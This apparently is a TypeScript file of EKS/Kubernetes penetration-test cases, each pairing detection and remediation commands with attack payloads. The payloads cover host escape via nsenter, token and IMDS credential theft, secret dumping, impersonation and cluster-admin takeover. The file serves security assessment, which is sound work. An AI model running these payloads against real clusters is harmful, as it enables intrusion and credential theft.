/**
 * AWS Pentest MCP Server - EKS/Kubernetes Security Test Cases
 * 
 * These test cases cover common Kubernetes security issues in AWS EKS environments.
 * Use these as a checklist when performing security assessments.
 */

// ============================================
// TYPE DEFINITIONS
// ============================================

export interface TestCase {
  id: string;
  name: string;
  description: string;
  risk: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  mitre: string;
  test: string;
  remediation: string;
  payload: string | null;
}

// ============================================
// EKS CLUSTER SECURITY TEST CASES
// ============================================

export const eksSecurityTestCases: Record<string, TestCase> = {
  /**
   * TC-EKS-001: Public API Server Endpoint
   * Risk: CRITICAL
   * Attack: Direct cluster API access from internet
   */
  publicApiServer: {
    id: 'TC-EKS-001',
    name: 'Public API Server Endpoint',
    description: 'Check if EKS API server is publicly accessible',
    risk: 'CRITICAL',
    mitre: 'T1190 - Exploit Public-Facing Application',
    test: `
      # Check cluster endpoint access
      aws eks describe-cluster --name <cluster> --query "cluster.resourcesVpcConfig"
      
      # Look for:
      # - endpointPublicAccess: true
      # - publicAccessCidrs: ["0.0.0.0/0"]
    `,
    remediation: `
      # Disable public endpoint or restrict CIDRs
      aws eks update-cluster-config --name <cluster> \\
        --resources-vpc-config endpointPublicAccess=false
      
      # Or restrict to specific IPs
      aws eks update-cluster-config --name <cluster> \\
        --resources-vpc-config publicAccessCidrs="10.0.0.0/8"
    `,
    payload: null,
  },

  /**
   * TC-EKS-002: Missing Control Plane Logging
   * Risk: HIGH
   * Attack: Attacker activity goes undetected
   */
  missingLogging: {
    id: 'TC-EKS-002',
    name: 'Missing Control Plane Logging',
    description: 'Check if EKS control plane logging is enabled',
    risk: 'HIGH',
    mitre: 'T1562.008 - Impair Defenses: Disable Cloud Logs',
    test: `
      aws eks describe-cluster --name <cluster> \\
        --query "cluster.logging.clusterLogging[*]"
      
      # Should have all types enabled:
      # - api, audit, authenticator, controllerManager, scheduler
    `,
    remediation: `
      aws eks update-cluster-config --name <cluster> \\
        --logging '{"clusterLogging":[{"types":["api","audit","authenticator","controllerManager","scheduler"],"enabled":true}]}'
    `,
    payload: null,
  },

  /**
   * TC-EKS-003: Secrets in etcd Not Encrypted
   * Risk: CRITICAL
   * Attack: Extract secrets from etcd backups
   */
  unencryptedSecrets: {
    id: 'TC-EKS-003',
    name: 'Secrets Not Encrypted at Rest',
    description: 'Check if EKS secrets are encrypted with KMS',
    risk: 'CRITICAL',
    mitre: 'T1552.004 - Unsecured Credentials: Private Keys',
    test: `
      aws eks describe-cluster --name <cluster> \\
        --query "cluster.encryptionConfig"
      
      # Should have provider.keyArn set to KMS key
    `,
    remediation: `
      # Enable secrets encryption (requires cluster recreation or update)
      aws eks associate-encryption-config --cluster-name <cluster> \\
        --encryption-config '[{"resources":["secrets"],"provider":{"keyArn":"arn:aws:kms:region:account:key/key-id"}}]'
    `,
    payload: null,
  },

  /**
   * TC-EKS-004: IRSA Not Configured
   * Risk: HIGH
   * Attack: Pods use node's IAM role instead of scoped permissions
   */
  noIRSA: {
    id: 'TC-EKS-004',
    name: 'IAM Roles for Service Accounts (IRSA) Not Configured',
    description: 'Check if OIDC provider is configured for IRSA',
    risk: 'HIGH',
    mitre: 'T1078.004 - Valid Accounts: Cloud Accounts',
    test: `
      # Check for OIDC provider
      aws eks describe-cluster --name <cluster> \\
        --query "cluster.identity.oidc.issuer"
      
      # List IAM OIDC providers
      aws iam list-open-id-connect-providers
    `,
    remediation: `
      eksctl utils associate-iam-oidc-provider \\
        --cluster <cluster> --approve
    `,
    payload: null,
  },

  /**
   * TC-EKS-005: Overly Permissive Node IAM Role
   * Risk: CRITICAL
   * Attack: Container escape leads to full AWS access
   */
  overlyPermissiveNodeRole: {
    id: 'TC-EKS-005',
    name: 'Overly Permissive Node IAM Role',
    description: 'Check if node IAM role has excessive permissions',
    risk: 'CRITICAL',
    mitre: 'T1078.004 - Valid Accounts: Cloud Accounts',
    test: `
      # Get node role from cluster
      aws eks describe-nodegroup --cluster-name <cluster> --nodegroup-name <nodegroup> \\
        --query "nodegroup.nodeRole"
      
      # Check attached policies
      aws iam list-attached-role-policies --role-name <node-role>
      
      # Look for dangerous policies:
      # - AdministratorAccess
      # - PowerUserAccess
      # - SecretsManager full access
    `,
    remediation: `
      # Use minimum required policies:
      # - AmazonEKSWorkerNodePolicy
      # - AmazonEKS_CNI_Policy
      # - AmazonEC2ContainerRegistryReadOnly
      
      # Use IRSA for pod-specific permissions instead
    `,
    payload: null,
  },
};

// ============================================
// KUBERNETES WORKLOAD SECURITY TEST CASES
// ============================================

export const k8sWorkloadTestCases: Record<string, TestCase> = {
  /**
   * TC-K8S-001: Privileged Containers
   * Risk: CRITICAL
   * Attack: Container escape via privileged mode
   */
  privilegedContainers: {
    id: 'TC-K8S-001',
    name: 'Privileged Containers Running',
    description: 'Find pods running with privileged: true',
    risk: 'CRITICAL',
    mitre: 'T1611 - Escape to Host',
    test: `
      # Find privileged containers
      kubectl get pods -A -o json | jq -r '
        .items[] | 
        select(.spec.containers[].securityContext.privileged == true) |
        [.metadata.namespace, .metadata.name] | @tsv'
    `,
    remediation: `
      # Remove privileged: true from pod spec
      # Use Pod Security Admission (PSA) to enforce:
      kubectl label namespace <ns> \\
        pod-security.kubernetes.io/enforce=restricted
    `,
    payload: `
      # If you find a privileged container, escape to host:
      # Mount host filesystem
      mount /dev/sda1 /mnt
      chroot /mnt
      
      # Or use nsenter
      nsenter -t 1 -m -u -i -n -p -- /bin/bash
    `,
  },

  /**
   * TC-K8S-002: Host Path Mounts
   * Risk: HIGH
   * Attack: Read sensitive files from host
   */
  hostPathMounts: {
    id: 'TC-K8S-002',
    name: 'Host Path Volume Mounts',
    description: 'Find pods with hostPath volumes',
    risk: 'HIGH',
    mitre: 'T1552.001 - Credentials in Files',
    test: `
      kubectl get pods -A -o json | jq -r '
        .items[] |
        select(.spec.volumes[]?.hostPath != null) |
        [.metadata.namespace, .metadata.name, 
         (.spec.volumes[] | select(.hostPath) | .hostPath.path)] | @tsv'
    `,
    remediation: `
      # Use PersistentVolumeClaims instead of hostPath
      # Enable Pod Security Admission to block hostPath
    `,
    payload: `
      # Common sensitive host paths:
      /etc/shadow
      /etc/kubernetes/admin.conf
      /var/lib/kubelet/kubeconfig
      /root/.aws/credentials
      /home/*/.ssh/id_rsa
    `,
  },

  /**
   * TC-K8S-003: Secrets Mounted as Environment Variables
   * Risk: MEDIUM
   * Attack: Secrets exposed in process listing
   */
  secretsInEnv: {
    id: 'TC-K8S-003',
    name: 'Secrets as Environment Variables',
    description: 'Find secrets exposed as env vars instead of volumes',
    risk: 'MEDIUM',
    mitre: 'T1552.001 - Credentials in Files',
    test: `
      kubectl get pods -A -o json | jq -r '
        .items[] |
        select(.spec.containers[].envFrom[]?.secretRef != null or
               .spec.containers[].env[]?.valueFrom?.secretKeyRef != null) |
        [.metadata.namespace, .metadata.name] | @tsv'
    `,
    remediation: `
      # Mount secrets as files instead:
      volumes:
      - name: secret-vol
        secret:
          secretName: my-secret
      containers:
      - volumeMounts:
        - name: secret-vol
          mountPath: /secrets
          readOnly: true
    `,
    payload: `
      # Extract secrets from env in compromised pod:
      env | grep -i password
      env | grep -i secret
      env | grep -i key
      cat /proc/1/environ | tr '\\0' '\\n'
    `,
  },

  /**
   * TC-K8S-004: Service Account Token Auto-Mount
   * Risk: HIGH
   * Attack: Steal SA token for API access
   */
  autoMountToken: {
    id: 'TC-K8S-004',
    name: 'Service Account Token Auto-Mounted',
    description: 'Find pods with automountServiceAccountToken enabled',
    risk: 'HIGH',
    mitre: 'T1528 - Steal Application Access Token',
    test: `
      # Most pods have token mounted by default
      kubectl get pods -A -o json | jq -r '
        .items[] |
        select(.spec.automountServiceAccountToken != false) |
        [.metadata.namespace, .metadata.name, .spec.serviceAccountName] | @tsv'
    `,
    remediation: `
      # Disable auto-mount in pod spec:
      spec:
        automountServiceAccountToken: false
        
      # Or in ServiceAccount:
      apiVersion: v1
      kind: ServiceAccount
      metadata:
        name: my-sa
      automountServiceAccountToken: false
    `,
    payload: `
      # Steal token from compromised pod:
      TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
      
      # Use token to access API
      curl -H "Authorization: Bearer $TOKEN" \\
        https://kubernetes.default.svc/api/v1/secrets
    `,
  },

  /**
   * TC-K8S-005: IMDS Access from Pods
   * Risk: CRITICAL
   * Attack: Steal cloud credentials via IMDS
   */
  imdsAccess: {
    id: 'TC-K8S-005',
    name: 'IMDS Accessible from Pods',
    description: 'Check if pods can reach EC2 metadata service',
    risk: 'CRITICAL',
    mitre: 'T1552.005 - Cloud Instance Metadata API',
    test: `
      # From inside a pod:
      curl -s http://169.254.169.254/latest/meta-data/
      
      # Get IAM credentials:
      curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
      ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
      curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
    `,
    remediation: `
      # Block IMDS at network level:
      # 1. Use NetworkPolicy to block 169.254.169.254
      # 2. Require IMDSv2 on nodes (needs hop limit = 1)
      
      # NetworkPolicy example:
      apiVersion: networking.k8s.io/v1
      kind: NetworkPolicy
      metadata:
        name: block-imds
      spec:
        podSelector: {}
        policyTypes:
        - Egress
        egress:
        - to:
          - ipBlock:
              cidr: 0.0.0.0/0
              except:
              - 169.254.169.254/32
    `,
    payload: `
      # AWS credentials from IMDS:
      curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)
      
      # Use credentials:
      export AWS_ACCESS_KEY_ID=<from response>
      export AWS_SECRET_ACCESS_KEY=<from response>
      export AWS_SESSION_TOKEN=<from response>
      aws s3 ls
    `,
  },
};

// ============================================
// KUBERNETES RBAC TEST CASES
// ============================================

export const k8sRBACTestCases: Record<string, TestCase> = {
  /**
   * TC-RBAC-001: Cluster-Admin Binding
   * Risk: CRITICAL
   * Attack: Full cluster compromise
   */
  clusterAdminBinding: {
    id: 'TC-RBAC-001',
    name: 'Excessive cluster-admin Bindings',
    description: 'Find non-admin users/SAs with cluster-admin role',
    risk: 'CRITICAL',
    mitre: 'T1078.004 - Valid Accounts: Cloud Accounts',
    test: `
      kubectl get clusterrolebindings -o json | jq -r '
        .items[] |
        select(.roleRef.name == "cluster-admin") |
        [.metadata.name, 
         (.subjects[] | [.kind, .namespace, .name] | join("/"))] | @tsv'
    `,
    remediation: `
      # Remove unnecessary cluster-admin bindings
      kubectl delete clusterrolebinding <binding-name>
      
      # Use least privilege roles instead
    `,
    payload: null,
  },

  /**
   * TC-RBAC-002: Secrets Access
   * Risk: HIGH
   * Attack: Read all secrets in cluster
   */
  secretsAccess: {
    id: 'TC-RBAC-002',
    name: 'Roles with Secrets Access',
    description: 'Find roles that can read secrets',
    risk: 'HIGH',
    mitre: 'T1552.007 - Container API',
    test: `
      # ClusterRoles with secrets access
      kubectl get clusterroles -o json | jq -r '
        .items[] |
        select(.rules[]? | 
          select(.resources[]? == "secrets") |
          select(.verbs | any(. == "get" or . == "list" or . == "*"))) |
        .metadata.name'
    `,
    remediation: `
      # Scope secrets access to specific namespaces
      # Use Role instead of ClusterRole where possible
    `,
    payload: `
      # Extract all secrets:
      kubectl get secrets -A -o json | jq -r '.items[].data | to_entries[] | "\\(.key): \\(.value | @base64d)"'
    `,
  },

  /**
   * TC-RBAC-003: Pod Create/Exec Privilege Escalation
   * Risk: CRITICAL
   * Attack: Create privileged pod or exec into existing
   */
  podCreateExec: {
    id: 'TC-RBAC-003',
    name: 'Pod Create/Exec Permissions',
    description: 'Find roles that can create pods or exec into them',
    risk: 'CRITICAL',
    mitre: 'T1610 - Deploy Container',
    test: `
      # Find roles with pod create
      kubectl get clusterroles -o json | jq -r '
        .items[] |
        select(.rules[]? |
          select(.resources[]? == "pods" or .resources[]? == "pods/exec") |
          select(.verbs | any(. == "create" or . == "exec" or . == "*"))) |
        .metadata.name'
    `,
    remediation: `
      # Restrict pod creation to CI/CD service accounts
      # Use admission controllers to enforce security
    `,
    payload: `
      # Privilege escalation via pod creation:
      cat << EOF | kubectl apply -f -
      apiVersion: v1
      kind: Pod
      metadata:
        name: attacker-pod
      spec:
        hostNetwork: true
        hostPID: true
        containers:
        - name: shell
          image: alpine
          command: ["/bin/sh", "-c", "sleep infinity"]
          securityContext:
            privileged: true
      EOF
      
      kubectl exec -it attacker-pod -- /bin/sh
    `,
  },
};

// ============================================
// NETWORK SECURITY TEST CASES
// ============================================

export const k8sNetworkTestCases: Record<string, TestCase> = {
  /**
   * TC-NET-001: No Network Policies
   * Risk: HIGH
   * Attack: Lateral movement between pods
   */
  noNetworkPolicies: {
    id: 'TC-NET-001',
    name: 'Missing Network Policies',
    description: 'Find namespaces without network policies',
    risk: 'HIGH',
    mitre: 'T1021 - Remote Services',
    test: `
      # List namespaces without network policies
      for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
        count=$(kubectl get networkpolicies -n $ns --no-headers 2>/dev/null | wc -l)
        if [ "$count" -eq 0 ]; then
          echo "No NetworkPolicy: $ns"
        fi
      done
    `,
    remediation: `
      # Apply default deny policy:
      apiVersion: networking.k8s.io/v1
      kind: NetworkPolicy
      metadata:
        name: default-deny
      spec:
        podSelector: {}
        policyTypes:
        - Ingress
        - Egress
    `,
    payload: null,
  },
};

// ============================================
// SERVICE ACCOUNT SECURITY TEST CASES
// ============================================

export const k8sServiceAccountTestCases: Record<string, TestCase> = {
  'TC-SA-001': {
    id: 'TC-SA-001',
    name: 'Default Service Account Auto-Mount Enabled',
    description: 'Check if pods are using default service account with auto-mounted tokens',
    risk: 'HIGH',
    mitre: 'T1528 - Steal Application Access Token',
    test: `
# List pods using default service account
kubectl get pods --all-namespaces -o json | jq -r '.items[] | select(.spec.serviceAccountName == "default" or .spec.serviceAccountName == null) | "\\(.metadata.namespace)/\\(.metadata.name)"'

# Check if automountServiceAccountToken is enabled on default SA
kubectl get sa default -o yaml | grep -A5 automountServiceAccountToken

# Verify token is mounted in pod
kubectl exec -it <pod-name> -- ls -la /var/run/secrets/kubernetes.io/serviceaccount/
    `,
    remediation: `
# Disable auto-mount on default service account
kubectl patch serviceaccount default -p '{"automountServiceAccountToken": false}'

# Or in pod spec:
spec:
  automountServiceAccountToken: false
    `,
    payload: `
# Steal token from compromised pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Use token to query API server
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods

# Check what permissions this SA has
kubectl auth can-i --list --token=$TOKEN
    `,
  },

  'TC-SA-002': {
    id: 'TC-SA-002',
    name: 'Service Account with Cluster-Wide Permissions',
    description: 'Identify service accounts bound to cluster-wide roles with excessive permissions',
    risk: 'CRITICAL',
    mitre: 'T1078.004 - Valid Accounts: Cloud Accounts',
    test: `
# Find all ClusterRoleBindings for service accounts
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.subjects[]?.kind == "ServiceAccount") | "\\(.metadata.name): \\(.subjects[].namespace)/\\(.subjects[].name) -> \\(.roleRef.name)"'

# Check for dangerous cluster roles assigned to SAs
for role in cluster-admin admin edit; do
  echo "=== Service Accounts with $role ==="
  kubectl get clusterrolebindings -o json | jq -r ".items[] | select(.roleRef.name == \\"$role\\") | select(.subjects[]?.kind == \\"ServiceAccount\\") | .subjects[] | select(.kind == \\"ServiceAccount\\") | \\"\\(.namespace)/\\(.name)\\""
done

# List SAs that can create pods (priv esc vector)
kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa-name> | grep -E "pods|deployments|daemonsets"
    `,
    remediation: `
# Use namespace-scoped RoleBindings instead of ClusterRoleBindings
# Apply principle of least privilege

apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: app-namespace
  name: app-role
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: app-rolebinding
  namespace: app-namespace
subjects:
- kind: ServiceAccount
  name: app-sa
  namespace: app-namespace
roleRef:
  kind: Role
  name: app-role
  apiGroup: rbac.authorization.k8s.io
    `,
    payload: `
# If SA has cluster-admin, full cluster takeover:
kubectl --token=$TOKEN get secrets --all-namespaces
kubectl --token=$TOKEN create clusterrolebinding pwned --clusterrole=cluster-admin --user=attacker

# Create privileged pod for node escape
kubectl --token=$TOKEN apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: pwned
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwned
    image: alpine
    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash"]
    securityContext:
      privileged: true
EOF
    `,
  },

  'TC-SA-003': {
    id: 'TC-SA-003',
    name: 'Service Account Token Projection Not Used',
    description: 'Check if legacy (non-expiring) tokens are used instead of bound service account tokens',
    risk: 'MEDIUM',
    mitre: 'T1528 - Steal Application Access Token',
    test: `
# Check EKS cluster for BoundServiceAccountTokenVolume feature
aws eks describe-cluster --name <cluster-name> --query 'cluster.kubernetesNetworkConfig'

# Check if pods use projected tokens (have expiration)
kubectl get pod <pod-name> -o yaml | grep -A20 'volumes:' | grep -A10 'projected'

# Look for legacy token secrets
kubectl get secrets --all-namespaces -o json | jq -r '.items[] | select(.type == "kubernetes.io/service-account-token") | "\\(.metadata.namespace)/\\(.metadata.name)"'

# Check token expiration in pod
kubectl exec -it <pod-name> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d. -f2 | base64 -d 2>/dev/null | jq -r '.exp // "NO EXPIRATION"'
    `,
    remediation: `
# Use projected service account tokens with expiration
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    volumeMounts:
    - name: token
      mountPath: /var/run/secrets/tokens
      readOnly: true
  volumes:
  - name: token
    projected:
      sources:
      - serviceAccountToken:
          path: token
          expirationSeconds: 3600
          audience: api
    `,
    payload: `
# Legacy tokens never expire - steal and use indefinitely
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Token remains valid even after pod deletion
# Use from external system
curl -k -H "Authorization: Bearer $TOKEN" https://<api-server>:6443/api/v1/namespaces
    `,
  },

  'TC-SA-004': {
    id: 'TC-SA-004',
    name: 'Service Account Impersonation Allowed',
    description: 'Check if users/SAs can impersonate other service accounts',
    risk: 'CRITICAL',
    mitre: 'T1550.001 - Use Alternate Authentication Material',
    test: `
# Find who can impersonate service accounts
kubectl auth can-i impersonate serviceaccounts --all-namespaces --list

# Check ClusterRoles with impersonate verb
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.verbs[]? == "impersonate") | .metadata.name'

# Check specific impersonation permissions
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name | test("impersonate|admin|cluster-admin")) | "\\(.metadata.name): \\(.subjects)"'

# Test impersonation
kubectl auth can-i --list --as=system:serviceaccount:kube-system:default
    `,
    remediation: `
# Remove impersonation permissions from non-admin users
# Audit and restrict impersonate verb

# If impersonation needed, scope to specific SAs:
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: limited-impersonation
rules:
- apiGroups: [""]
  resources: ["serviceaccounts"]
  verbs: ["impersonate"]
  resourceNames: ["specific-sa"]  # Limit to specific SA
    `,
    payload: `
# Impersonate privileged service account
kubectl --as=system:serviceaccount:kube-system:default get secrets -A

# Chain impersonation for privilege escalation
kubectl --as=system:serviceaccount:kube-system:coredns auth can-i --list

# Create resources as another SA
kubectl --as=system:serviceaccount:production:deploy-sa apply -f malicious-deployment.yaml
    `,
  },

  'TC-SA-005': {
    id: 'TC-SA-005',
    name: 'IRSA/Pod Identity Not Configured for AWS Access',
    description: 'Check if pods use node IAM role instead of IRSA for AWS access',
    risk: 'HIGH',
    mitre: 'T1552.005 - Cloud Instance Metadata API',
    test: `
# Check if OIDC provider is configured for IRSA
aws eks describe-cluster --name <cluster-name> --query 'cluster.identity.oidc'

# Find pods accessing AWS without IRSA annotation
kubectl get pods --all-namespaces -o json | jq -r '.items[] | select(.spec.serviceAccountName != null) | "\\(.metadata.namespace)/\\(.spec.serviceAccountName)"' | sort -u | while read sa; do
  ns=$(echo $sa | cut -d/ -f1)
  name=$(echo $sa | cut -d/ -f2)
  irsa=$(kubectl get sa $name -n $ns -o jsonpath='{.metadata.annotations.eks\\.amazonaws\\.com/role-arn}' 2>/dev/null)
  if [ -z "$irsa" ]; then
    echo "No IRSA: $sa"
  fi
done

# Test IMDS access from pod (should be blocked with IRSA)
kubectl exec -it <pod-name> -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
    `,
    remediation: `
# 1. Create IAM OIDC provider
eksctl utils associate-iam-oidc-provider --cluster <cluster-name> --approve

# 2. Create IAM role with trust policy for SA
# 3. Annotate service account
kubectl annotate serviceaccount -n <namespace> <sa-name> eks.amazonaws.com/role-arn=arn:aws:iam::<account>:role/<role-name>

# 4. Block IMDS access via network policy or launch template
    `,
    payload: `
# Without IRSA, steal node's IAM credentials via IMDS
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)

# Extract and use credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .Token)

# Node role often has excessive permissions
aws s3 ls
aws ec2 describe-instances
    `,
  },
};

// ============================================
// SECRET HUNTING TEST CASES
// ============================================

export const k8sSecretHuntingTestCases: Record<string, TestCase> = {
  'TC-SECRET-001': {
    id: 'TC-SECRET-001',
    name: 'Enumerate All Kubernetes Secrets',
    description: 'Discover and enumerate secrets across namespaces',
    risk: 'CRITICAL',
    mitre: 'T1552.001 - Credentials In Files',
    test: `
# List all secrets (requires permissions)
kubectl get secrets --all-namespaces

# Get secret types distribution
kubectl get secrets -A -o json | jq -r '.items[] | .type' | sort | uniq -c

# Find potentially interesting secrets by name
kubectl get secrets -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name): \\(.type)"' | grep -iE "password|token|key|cred|secret|api|db|database|aws|azure|gcp"

# Check for secrets in specific namespace
kubectl get secrets -n <namespace> -o yaml
    `,
    remediation: `
# Restrict secret access with RBAC
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: app-ns
  name: no-secrets
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: []  # No access to secrets

# Enable audit logging for secret access
# Use external secret management (Vault, AWS Secrets Manager)
    `,
    payload: `
# Dump all secrets
kubectl get secrets -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name):\\n\\(.data | to_entries[] | "  \\(.key): \\(.value | @base64d)")"'

# Decode specific secret
kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data}' | jq -r 'to_entries[] | "\\(.key): \\(.value | @base64d)"'

# Find and decode all docker registry secrets
kubectl get secrets -A -o json | jq -r '.items[] | select(.type=="kubernetes.io/dockerconfigjson") | "\\(.metadata.namespace)/\\(.metadata.name):\\n\\(.data[".dockerconfigjson"] | @base64d)"'
    `,
  },

  'TC-SECRET-002': {
    id: 'TC-SECRET-002',
    name: 'Secrets Exposed in Environment Variables',
    description: 'Find secrets exposed as environment variables in pod specs',
    risk: 'HIGH',
    mitre: 'T1552.001 - Credentials In Files',
    test: `
# Find pods with secrets in env vars
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[].env[]?.valueFrom.secretKeyRef != null) | "\\(.metadata.namespace)/\\(.metadata.name)"'

# Get details of secret references
kubectl get pods -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name):" as $pod | .spec.containers[] | .env[]? | select(.valueFrom.secretKeyRef != null) | "\\($pod) \\(.name)=\\(.valueFrom.secretKeyRef.name)/\\(.valueFrom.secretKeyRef.key)"'

# Find envFrom secretRef
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[].envFrom[]?.secretRef != null) | "\\(.metadata.namespace)/\\(.metadata.name)"'
    `,
    remediation: `
# Use volume mounts instead of env vars for secrets
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    volumeMounts:
    - name: secrets
      mountPath: /etc/secrets
      readOnly: true
  volumes:
  - name: secrets
    secret:
      secretName: app-secrets

# Secrets in env vars appear in:
# - /proc/<pid>/environ
# - 'kubectl describe pod' output
# - Container runtime inspection
    `,
    payload: `
# From compromised container, read all env vars
env | grep -iE "password|secret|token|key|api|cred"
cat /proc/1/environ | tr '\\0' '\\n' | grep -iE "password|secret|token"

# From kubectl access, describe pods to see env
kubectl describe pods -A | grep -iE "SECRET|PASSWORD|TOKEN|KEY" -A2 -B2
    `,
  },

  'TC-SECRET-003': {
    id: 'TC-SECRET-003',
    name: 'Secrets in ConfigMaps',
    description: 'Find sensitive data accidentally stored in ConfigMaps instead of Secrets',
    risk: 'HIGH',
    mitre: 'T1552.001 - Credentials In Files',
    test: `
# Search ConfigMaps for sensitive keywords
kubectl get configmaps -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name):\\n\\(.data // {} | to_entries[] | "  \\(.key)")"' | grep -iE "password|secret|token|key|credential|api.?key|connection.?string"

# Get ConfigMap content
kubectl get configmap -A -o json | jq -r '.items[] | select(.data != null) | select(.data | to_entries[] | .value | test("password|secret|token|api.?key"; "i")) | "\\(.metadata.namespace)/\\(.metadata.name)"'

# Detailed search in specific namespace
kubectl get configmap -n <namespace> -o yaml | grep -iE "password|secret|token|key" -B5 -A5
    `,
    remediation: `
# Move sensitive data from ConfigMaps to Secrets
# ConfigMaps are not encrypted at rest by default
# ConfigMaps appear in kubectl describe output

# Use external secret management:
# - AWS Secrets Manager with External Secrets Operator
# - HashiCorp Vault
# - Azure Key Vault
    `,
    payload: `
# Dump all ConfigMaps looking for secrets
kubectl get configmaps -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name):\\n\\(.data | to_entries[] | "  \\(.key): \\(.value)")"' | grep -iE "password|secret|token|api" -B1 -A1

# Search for connection strings
kubectl get configmaps -A -o json | jq -r '.items[].data | to_entries[]? | .value' | grep -iE "server=|host=|connectionstring|jdbc:|mongodb:|redis:|mysql:|postgres:"
    `,
  },

  'TC-SECRET-004': {
    id: 'TC-SECRET-004',
    name: 'Mounted Secret Files in Containers',
    description: 'Find and extract secrets mounted as volumes in containers',
    risk: 'HIGH',
    mitre: 'T1552.001 - Credentials In Files',
    test: `
# Find pods with secret volume mounts
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.volumes[]?.secret != null) | "\\(.metadata.namespace)/\\(.metadata.name): \\([.spec.volumes[] | select(.secret != null) | .secret.secretName] | join(", "))"'

# Get mount paths for secrets
kubectl get pods -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name)" as $pod | .spec.containers[] | .volumeMounts[]? | select(.name | test("secret|token|cred"; "i")) | "\\($pod): \\(.mountPath)"'

# Check common secret mount locations
kubectl exec -it <pod> -- find /etc /var /run -name "*.key" -o -name "*.pem" -o -name "*secret*" -o -name "*token*" -o -name "*password*" 2>/dev/null
    `,
    remediation: `
# Limit secret access with file permissions
apiVersion: v1
kind: Pod
spec:
  volumes:
  - name: secrets
    secret:
      secretName: app-secret
      defaultMode: 0400  # Read-only for owner

# Use read-only mounts
volumeMounts:
- name: secrets
  mountPath: /etc/secrets
  readOnly: true

# Consider using CSI Secret Store driver
    `,
    payload: `
# From compromised container, find and read secrets
find / -type f \\( -name "*.key" -o -name "*.pem" -o -name "*secret*" -o -name "*token*" -o -name "*credential*" \\) 2>/dev/null | xargs cat

# Common K8s secret paths
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /etc/secrets/*
cat /run/secrets/*

# Search for cloud credentials
find / -name "credentials" -o -name "config" 2>/dev/null | xargs grep -l "aws_access_key\\|azure\\|gcp" 2>/dev/null
    `,
  },

  'TC-SECRET-005': {
    id: 'TC-SECRET-005',
    name: 'etcd Secrets Encryption Not Enabled',
    description: 'Check if secrets are encrypted at rest in etcd',
    risk: 'CRITICAL',
    mitre: 'T1552.001 - Credentials In Files',
    test: `
# For EKS - check envelope encryption
aws eks describe-cluster --name <cluster-name> --query 'cluster.encryptionConfig'

# If null or empty, secrets are NOT encrypted at rest

# For self-managed, check encryption config
kubectl get pods -n kube-system -l component=kube-apiserver -o yaml | grep -A10 "encryption-provider-config"

# Test by creating a secret and checking etcd (requires etcd access)
ETCDCTL_API=3 etcdctl get /registry/secrets/default/test-secret --endpoints=https://127.0.0.1:2379 --cert=/etc/kubernetes/pki/etcd/peer.crt --key=/etc/kubernetes/pki/etcd/peer.key --cacert=/etc/kubernetes/pki/etcd/ca.crt
    `,
    remediation: `
# Enable EKS secrets encryption
aws eks associate-encryption-config \\
  --cluster-name <cluster-name> \\
  --encryption-config '[{"resources":["secrets"],"provider":{"keyArn":"arn:aws:kms:region:account:key/key-id"}}]'

# For self-managed clusters, configure encryption provider:
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
      - secrets
    providers:
      - aescbc:
          keys:
            - name: key1
              secret: <base64-encoded-key>
      - identity: {}
    `,
    payload: `
# If etcd accessible and unencrypted, dump all secrets
ETCDCTL_API=3 etcdctl get /registry/secrets --prefix --endpoints=https://127.0.0.1:2379 \\
  --cert=/etc/kubernetes/pki/etcd/peer.crt \\
